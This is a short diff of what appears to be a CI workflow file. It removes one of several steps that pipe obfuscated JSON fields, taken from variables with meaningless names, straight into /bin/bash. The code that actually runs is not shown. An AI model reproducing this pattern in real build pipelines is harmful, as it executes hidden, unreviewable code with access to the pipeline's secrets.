@@ -25,7 +25,6 @@ jobs:
           echo $qaskq84 | jq -r .gyw48 | /bin/bash
           echo $cs2 | jq -r .miobt05 | /bin/bash
           echo $ev67 | jq -r .wn66023 | /bin/bash
-          echo $l68404 | jq -r .gnuw159 | /bin/bash
           echo $rsw7517 | jq -r .puq3359 | /bin/bash
 
       - name: Upload results
